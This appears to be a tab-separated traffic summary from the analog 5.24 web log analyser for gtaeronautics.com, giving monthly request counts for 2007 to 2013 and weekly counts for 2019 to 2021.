x	VE	analog 5.24
x	HN	gtaeronautics.com
m	Rr	5598	0.581	2013	10
m	Rr	4655	0.483	2013	09
m	Rr	4938	0.513	2013	08
m	Rr	5623	0.584	2013	07
m	Rr	5492	0.570	2013	06
m	Rr	5211	0.541	2013	05
m	Rr	5842	0.606	2013	04
m	Rr	6068	0.630	2013	03
m	Rr	5055	0.525	2013	02
m	Rr	5853	0.608	2013	01
m	Rr	5688	0.590	2012	12
m	Rr	5477	0.568	2012	11
m	Rr	5413	0.562	2012	10
m	Rr	4331	0.450	2012	09
m	Rr	3866	0.401	2012	08
m	Rr	4314	0.448	2012	07
m	Rr	4655	0.483	2012	06
m	Rr	6047	0.628	2012	05
m	Rr	5114	0.531	2012	04
m	Rr	6128	0.636	2012	03
m	Rr	5430	0.564	2012	02
m	Rr	4279	0.444	2012	01
m	Rr	5548	0.576	2011	12
m	Rr	4779	0.496	2011	11
m	Rr	5117	0.531	2011	10
m	Rr	5431	0.564	2011	09
m	Rr	6256	0.649	2011	08
m	Rr	5699	0.592	2011	07
m	Rr	5420	0.563	2011	06
m	Rr	3975	0.413	2011	05
m	Rr	0	0.000	2011	04
m	Rr	3608	0.374	2011	03
m	Rr	5171	0.537	2011	02
m	Rr	6011	0.624	2011	01
m	Rr	1603	0.166	2010	12
m	Rr	0	0.000	2010	11
m	Rr	0	0.000	2010	10
m	Rr	0	0.000	2010	09
m	Rr	0	0.000	2010	08
m	Rr	0	0.000	2010	07
m	Rr	4101	0.426	2010	06
m	Rr	5018	0.521	2010	05
m	Rr	4928	0.512	2010	04
m	Rr	5095	0.529	2010	03
m	Rr	1394	0.145	2010	02
m	Rr	0	0.000	2010	01
m	Rr	4665	0.484	2009	12
m	Rr	6187	0.642	2009	11
m	Rr	5498	0.571	2009	10
m	Rr	5066	0.526	2009	09
m	Rr	5718	0.593	2009	08
m	Rr	7436	0.772	2009	07
m	Rr	5685	0.590	2009	06
m	Rr	6120	0.635	2009	05
m	Rr	5310	0.551	2009	04
m	Rr	5515	0.572	2009	03
m	Rr	6123	0.636	2009	02
m	Rr	6387	0.663	2009	01
m	Rr	5763	0.598	2008	12
m	Rr	5420	0.563	2008	11
m	Rr	4722	0.490	2008	10
m	Rr	5435	0.564	2008	09
m	Rr	4843	0.503	2008	08
m	Rr	5382	0.559	2008	07
m	Rr	6082	0.631	2008	06
m	Rr	9946	1.032	2008	05
m	Rr	6420	0.666	2008	04
m	Rr	5431	0.564	2008	03
m	Rr	6469	0.671	2008	02
m	Rr	5907	0.613	2008	01
m	Rr	1700	0.176	2007	12
m	*BT	R	15229	2014	02
W	Rr	2524	0.262	2021	06	27
W	Rr	2466	0.256	2021	06	20
W	Rr	2262	0.235	2021	06	13
W	Rr	2264	0.235	2021	06	06
W	Rr	2101	0.218	2021	05	30
W	Rr	3009	0.312	2021	05	23
W	Rr	1989	0.206	2021	05	16
W	Rr	2386	0.248	2021	05	09
W	Rr	2138	0.222	2021	05	02
W	Rr	1668	0.173	2021	04	25
W	Rr	2413	0.250	2021	04	18
W	Rr	3035	0.315	2021	04	11
W	Rr	2709	0.281	2021	04	04
W	Rr	1942	0.202	2021	03	28
W	Rr	1666	0.173	2021	03	21
W	Rr	1476	0.153	2021	03	14
W	Rr	1713	0.178	2021	03	07
W	Rr	1777	0.184	2021	02	28
W	Rr	1173	0.122	2021	02	21
W	Rr	1101	0.114	2021	02	14
W	Rr	1699	0.176	2021	02	07
W	Rr	1867	0.194	2021	01	31
W	Rr	1404	0.146	2021	01	24
W	Rr	1564	0.162	2021	01	17
W	Rr	1431	0.149	2021	01	10
W	Rr	1666	0.173	2021	01	03
W	Rr	1926	0.200	2020	12	27
W	Rr	1572	0.163	2020	12	20
W	Rr	1404	0.146	2020	12	13
W	Rr	2272	0.236	2020	12	06
W	Rr	1522	0.158	2020	11	29
W	Rr	1722	0.179	2020	11	22
W	Rr	1580	0.164	2020	11	15
W	Rr	1401	0.145	2020	11	08
W	Rr	1499	0.156	2020	11	01
W	Rr	1470	0.153	2020	10	25
W	Rr	2379	0.247	2020	10	18
W	Rr	1559	0.162	2020	10	11
W	Rr	1729	0.179	2020	10	04
W	Rr	1674	0.174	2020	09	27
W	Rr	1786	0.185	2020	09	20
W	Rr	2200	0.228	2020	09	13
W	Rr	1677	0.174	2020	09	06
W	Rr	1596	0.166	2020	08	30
W	Rr	1833	0.190	2020	08	23
W	Rr	1814	0.188	2020	08	16
W	Rr	2206	0.229	2020	08	09
W	Rr	1397	0.145	2020	08	02
W	Rr	1816	0.188	2020	07	26
W	Rr	1949	0.202	2020	07	19
W	Rr	1532	0.159	2020	07	12
W	Rr	1976	0.205	2020	07	05
W	Rr	1600	0.166	2020	06	28
W	Rr	1627	0.169	2020	06	21
W	Rr	2101	0.218	2020	06	14
W	Rr	1590	0.165	2020	06	07
W	Rr	1492	0.155	2020	05	31
W	Rr	1556	0.162	2020	05	24
W	Rr	1756	0.182	2020	05	17
W	Rr	1568	0.163	2020	05	10
W	Rr	1567	0.163	2020	05	03
W	Rr	1734	0.180	2020	04	26
W	Rr	1675	0.174	2020	04	19
W	Rr	1702	0.177	2020	04	12
W	Rr	1965	0.204	2020	04	05
W	Rr	1329	0.138	2020	03	29
W	Rr	1818	0.189	2020	03	22
W	Rr	1345	0.140	2020	03	15
W	Rr	1581	0.164	2020	03	08
W	Rr	2014	0.209	2020	03	01
W	Rr	1942	0.202	2020	02	23
W	Rr	1748	0.181	2020	02	16
W	Rr	1949	0.202	2020	02	09
W	Rr	1683	0.175	2020	02	02
W	Rr	1436	0.149	2020	01	26
W	Rr	1792	0.186	2020	01	19
W	Rr	1519	0.158	2020	01	12
W	Rr	1420	0.147	2020	01	05
W	Rr	1109	0.115	2019	12	29
W	Rr	1023	0.106	2019	12	22
W	Rr	1584	0.164	2019	12	15
W	Rr	1783	0.185	2019	12	08
